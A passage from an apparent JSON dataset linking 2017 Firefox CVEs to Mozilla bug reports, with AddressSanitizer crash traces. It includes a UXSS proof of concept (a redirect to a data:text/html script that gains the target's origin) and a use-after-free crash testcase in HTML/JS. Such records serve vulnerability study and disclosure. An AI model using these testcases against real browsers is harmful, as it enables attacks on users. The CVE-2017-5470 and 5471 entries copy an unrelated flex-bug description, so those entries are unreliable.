mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6233:19 #26 0x7f8d40034966 in mozilla::layers::ClientPaintedLayer::PaintThebes(nsTArray<mozilla::layers::ReadbackProcessor::Update>*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:85:5 #27 0x7f8d40035611 in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:139:3 #28 0x7f8d4006810f in mozilla::layers::ClientContainerLayer::RenderLayer() /home/worker/workspace/build/src/gfx/layers/client/ClientContainerLayer.h:57:29 #29 0x7f8d4006810f in mozilla::layers::ClientContainerLayer::RenderLayer() /home/worker/workspace/build/src/gfx/layers/client/ClientContainerLayer.h:57:29 #30 0x7f8d4002fcb7 in mozilla::layers::ClientLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:358:13 #31 0x7f8d40030527 in mozilla::layers::ClientLayerManager::EndTransaction(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:411:3 #32 0x7f8d44ff4b51 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:2253:17 #33 0x7f8d447e7554 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3714:12 #34 0x7f8d446eaf2a in mozilla::PresShell::Paint(nsView*, nsRegion const&, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:6489:5 #35 0x7f8d43f4cff4 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) /home/worker/workspace/build/src/view/nsViewManager.cpp:483:19 #36 0x7f8d43f4c54f in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:415:33 #37 0x7f8d43f4faed in nsViewManager::ProcessPendingUpdates() /home/worker/workspace/build/src/view/nsViewManager.cpp:1104:5 #38 0x7f8d44648596 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2031:11 #39 0x7f8d44654553 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:299:7 #40 0x7f8d44654224 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:321:5 #41 0x7f8d446569c5 in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:711:5 #42 0x7f8d446569c5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:624 #43 0x7f8d44656bfe in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByConstLRef<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #44 0x7f8d44656bfe in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #45 0x7f8d44656bfe in mozilla::detail::RunnableMethodImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver*, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #46 0x7f8d3e06238c in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #47 0x7f8d3e05ecb8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #48 0x7f8d3ee06e21 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #49 0x7f8d3ed67980 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #50 0x7f8d3ed67980 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #51 0x7f8d3ed67980 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #52 0x7f8d43fc682f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #53 0x7f8d474273c1 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:30 #54 0x7f8d475e78ca in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4492:22 #55 0x7f8d475e9353 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4670:8 #56 0x7f8d475ea6dc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4761:21 #57 0x4eb2b3 in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:236:22 #58 0x4eb2b3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:307 #59 0x7f8d5914d82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #60 0x41ce08 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41ce08) 0x7f8cd2946336 is located 1226 bytes to the left of 162639-byte region [0x7f8cd2946800,0x7f8cd296e34f) allocated by thread T0 here: #0 0x4bb873 in calloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:72:3 #1 0x7f8d3fd5a936 in Realloc /home/worker/workspace/build/src/gfx/2d/Tools.h:179:41 #2 0x7f8d3fd5a936 in mozilla::gfx::SourceSurfaceAlignedRawData::Init(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool, unsigned char, int) /home/worker/workspace/build/src/gfx/2d/SourceSurfaceRawData.cpp:66 #3 0x7f8d3fc40c98 in mozilla::gfx::Factory::CreateDataSourceSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool) /home/worker/workspace/build/src/gfx/2d/Factory.cpp:878:16 #4 0x7f8d3fcb1bd7 in mozilla::gfx::GetDataSurfaceInRect(mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::ConvolveMatrixEdgeMode) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:434:5 #5 0x7f8d3fcb8903 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:753:15 #6 0x7f8d3fcd0d8d in already_AddRefed<mozilla::gfx::DataSourceSurface> mozilla::gfx::FilterNodeConvolveMatrixSoftware::DoRender<int>(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, int, int) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2460:5 #7 0x7f8d3fcd089a in mozilla::gfx::FilterNodeConvolveMatrixSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2379:12 #8 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #9 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #10 0x7f8d3fce4035 in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3140:10 #11 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #12 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #13 0x7f8d3fce4895 in mozilla::gfx::FilterNodeUnpremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3197:5 #14 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #15 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #16 0x7f8d3fcc7832 in mozilla::gfx::FilterNodeComponentTransferSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:1781:5 #17 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #18 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #19 0x7f8d3fce4685 in mozilla::gfx::FilterNodePremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3168:5 #20 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #21 0x7f8d3fc7cb43 in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:580:14 #22 0x7f8d3fd8bc6e in mozilla::gfx::FilterSupport::RenderFilterDescription(mozilla::gfx::DrawTarget*, mozilla::gfx::FilterDescription const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, nsTArray<RefPtr<mozilla::gfx::SourceSurface> >&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/src/FilterSupport.cpp:1360:8 #23 0x7f8d44ccc3fd in nsFilterInstance::Render(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:545:3 #24 0x7f8d44ccb7ee in nsFilterInstance::PaintFilteredFrame(nsIFrame*, mozilla::gfx::DrawTarget*, gfxMatrix const&, nsSVGFilterPaintCallback*, nsRegion const*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:81:19 #25 0x7f8d44d09f72 in nsSVGIntegrationUtils::PaintFilter(nsSVGIntegrationUtils::PaintFramesParams const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:1094:5 #26 0x7f8d44f7e9bd in PaintAsLayer /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:8330:30 #27 0x7f8d44f7e9bd in PaintInactiveLayer /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:3722 #28 0x7f8d44f7e9bd in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, mozilla::gfx::IntPointTyped<mozilla::gfx::UnknownUnits> const&, float, float, int) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6044 #29 0x7f8d44f819f2 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6233:19 #30 0x7f8d40034966 in mozilla::layers::ClientPaintedLayer::PaintThebes(nsTArray<mozilla::layers::ReadbackProcessor::Update>*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:85:5 #31 0x7f8d40035611 in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:139:3 #32 0x7f8d4006810f in mozilla::layers::ClientContainerLayer::RenderLayer() /home/worker/workspace/build/src/gfx/layers/client/ClientContainerLayer.h:57:29 SUMMARY: AddressSanitizer: heap-buffer-overflow /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2293:10 in ColorComponentAtPoint Shadow bytes around the buggy address: 0x0ff21a520c10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0ff21a520c60: fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa 0x0ff21a520c70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520c90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520ca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff21a520cb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==25524==ABORTING"
      }
    ],
    "CVE-2017-5466": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1353975",
        "title": "UXSS: Origin confusion when reloading isolated data:text/html URL",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20170323105023 Steps to reproduce: - Assume http://target/ has a link to http://evil/ and a victim user clicks the link. <a href=http://evil>link</a> - http://evil/ redirects to data:text/html URL with Location header. Location: data:text/html,<script>d=document.domain;if(d){alert(d)}else{location.reload()}</script> - The page's JavaScript executes location.reload() because its origin is blank. Actual results: The reloaded data:text/html page runs in the context of http://target. So, in the example above, a popup saying \"target\" shows up. The test redirector is at http://ttera.lolipop.jp/. The attack was confirmed to work on the latest version (v52.0.2 on Windows7 / MacOS 10). Expected results: The reloaded page should run in a blank isolated origin."
      }
    ],
    "CVE-2017-5467": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1347262",
        "title": "Potential Skia overflow due to round_asymmetric_to_int bug",
        "description": "Upstream Skia security bug (https://bugs.chromium.org/p/skia/issues/detail?id=6294) details a variant of bug 1330166 that was not handled by that fix. All relevant security details of this bug should basically be the same as in bug 133016, just that this is a new way to trigger it. I've fixed up that case now with this patch that ensures the rounding is properly biased for all sides of the bounds rect. This patch was submitted upstream here: https://skia-review.googlesource.com/c/9700/"
      }
    ],
    "CVE-2017-5469": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1292534",
        "title": "flex: buffer overflow in generated code",
        "description": "http://seclists.org/oss-sec/2016/q3/163 CVE-2016-6354 Some versions of The Fast Lexical Analyzer contain a bug which causes it to produce code potentially vulnerable to a buffer overrun. While the fix should be made upstream (CMU Sphinx and ANGLE) in the first place, it might be a good idea to apply this hotfix for now."
      }
    ],
    "CVE-2017-5470": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1359639%2C1349595%2C1352295%2C1352556%2C1342552%2C1342567%2C1346012%2C1366140%2C1368732%2C1297111%2C1362590%2C1357462%2C1363280%2C1349266%2C1352093%2C1348424%2C1347748%2C1356025%2C1325513%2C1367692",
        "description": "http://seclists.org/oss-sec/2016/q3/163 CVE-2016-6354 Some versions of The Fast Lexical Analyzer contain a bug which causes it to produce code potentially vulnerable to a buffer overrun. While the fix should be made upstream (CMU Sphinx and ANGLE) in the first place, it might be a good idea to apply this hotfix for now."
      }
    ],
    "CVE-2017-5471": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1349604%2C1318645%2C1361098%2C1361100%2C1341026%2C1349421%2C1360852%2C1299147%2C1352073%2C1354853%2C1366446%2C1342181%2C1343069",
        "description": "http://seclists.org/oss-sec/2016/q3/163 CVE-2016-6354 Some versions of The Fast Lexical Analyzer contain a bug which causes it to produce code potentially vulnerable to a buffer overrun. While the fix should be made upstream (CMU Sphinx and ANGLE) in the first place, it might be a good idea to apply this hotfix for now."
      }
    ],
    "CVE-2017-5472": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1365602",
        "title": "heap-use-after-free in nsQuoteList::RecalcAll",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.1.0 (BuildID=20170417135202). <script> function start() { o1=window.document; o186=document.createElementNS('http://www.w3.org/1999/xhtml','script'); o221=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); document.documentElement.appendChild(o221); o224=document.createElementNS('http://www.w3.org/1999/xhtml','audio'); o264=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); document.documentElement.appendChild(o264); o326=document.createElementNS('http://www.w3.org/1999/xhtml','td'); window.top.document.documentElement.appendChild(o224); o186.prepend(undefined,undefined); o326.appendChild(o186); o531=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); document.body.onerror=fun0; o224.after(undefined,o531,o326); } function fun0() { o625=o531.contentWindow; o683=document.createElementNS('http://www.w3.org/1999/xhtml','h6'); window.top.document.documentElement.appendChild(o264); o683.innerHTML=\"<q cellpadding>\"; document.documentElement.addEventListener('DOMAttrModified',fun1); document.documentElement.setAttribute('step','0'); } var c=0; function fun1() { if(c++!=0)fun2(); else { document.documentElement.style.position='relative'; o1040=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); // hopefully document.documentElement.appendChild(o1040); o1099=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); document.documentElement.appendChild(o1099); o1115=o1099.contentWindow; o1305=o625.document; o1319=window.top.frames[1]; o1357=o1319.document; o1358=o1040.contentWindow; o1359=o1358.document; o1360=o1359.documentElement; o1363=o1115.document; o1364=o1363.documentElement; o1403=o1305.documentElement; o1412=function() {let x=o1357.querySelectorAll('*:not([id])');return x[x.length-1]}(); o1449=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o1449.src=\"data:text/html,x\"; o1403.appendChild(o1449); o1364.appendChild(o921); window.top.document.documentElement.appendChild(o1360); o1360.innerHTML=\"<q id==><hgroup>\";; window.top.document.documentElement.appendChild(o683); o1412.onpagehide=fun3; } } function fun2() { o850=(new DOMParser()).parseFromString('<dl contenteditable>','text/html'); o921=o850.all[2]; o1.designMode='on'; } function fun3() { o2034=document.createElementNS('http://www.w3.org/1999/xhtml','style'); o2034.style.display='ruby-text'; window.top.document.documentElement.appendChild(o2034); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12107==ERROR: AddressSanitizer: heap-use-after-free on address 0x60600029a568 at pc 0x7ff785f8a2d8 bp 0x7ffc107c2de0 sp 0x7ffc107c2dd8 READ of size 8 at 0x60600029a568 thread T0 #0 0x7ff785f8a2d7 in getNext /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/LinkedList.h:206:41 #1 0x7ff785f8a2d7 in Next /home/worker/workspace/build/src/layout/base/nsGenConList.h:94 #2 0x7ff785f8a2d7 in Next /home/worker/workspace/build/src/layout/base/nsQuoteList.h:80 #3 0x7ff785f8a2d7 in nsQuoteList::RecalcAll() /home/worker/workspace/build/src/layout/base/nsQuoteList.cpp:77 #4 0x7ff785d972ae in nsCSSFrameConstructor::RecalcQuotesAndCounters() /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8723:5 #5 0x7ff785f4fb08 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4192:7 #6 0x7ff781f4f2f0 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7774:7 #7 0x7ff781f4f110 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7752:5 #8 0x7ff781f4f110 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7752:5 #9 0x7ff780f97da3 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:683:9 #10 0x7ff780f9a304 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #11 0x7ff780f9aebc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #12 0x7ff77f54b2ca in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #13 0x7ff77f54766f in mozilla::net::nsLoadGroup::Cancel(nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:270:15 #14 0x7ff780f9782f in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:243:10 #15 0x7ff780f976a8 in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:240:3 #16 0x7ff786bbf041 in Stop /home/worker/workspace/build/src/docshell/base/nsDocShell.h:189:12 #17 0x7ff786bbf041 in nsDocShell::Stop(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5547 #18 0x7ff786be4bed in nsDocShell::InternalLoad(nsIURI*, nsIURI*, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsAString_internal const&, char const*, nsAString_internal const&, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsAString_internal const&, nsIDocShell*, nsIURI*, nsIDocShell**, nsIRequest**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:10631:12 #19 0x7ff786bdc794 in nsDocShell::LoadURI(nsIURI*, nsIDocShellLoadInfo*, unsigned int, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1560:10 #20 0x7ff781fb86dc in nsFrameLoader::ReallyStartLoadingInternal() /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:596:8 #21 0x7ff781f297f9 in ReallyStartLoading /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:480:17 #22 0x7ff781f297f9 in nsDocument::MaybeInitializeFinalizeFrameLoaders() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:6913 #23 0x7ff781f290d7 in nsDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:4797:3 #24 0x7ff78416390c in nsHTMLDocument::EndUpdate(unsigned int) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2424:3 #25 0x7ff782025574 in ~mozAutoDocUpdate /home/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:40:7 #26 0x7ff782025574 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:2521 #27 0x7ff782021293 in InsertBefore /home/worker/workspace/build/src/dom/base/nsINode.h:1850:12 #28 0x7ff782021293 in nsINode::After(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1809 #29 0x7ff783483b8b in mozilla::dom::ElementBinding::after(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:3483:3 #30 0x7ff7839b8af0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2879:13 #31 0x7ff789be2f55 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #32 0x7ff789be2f55 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #33 0x7ff789bc335f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #34 0x7ff789bc335f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #35 0x7ff789ba851d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #36 0x7ff789be35bf in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, 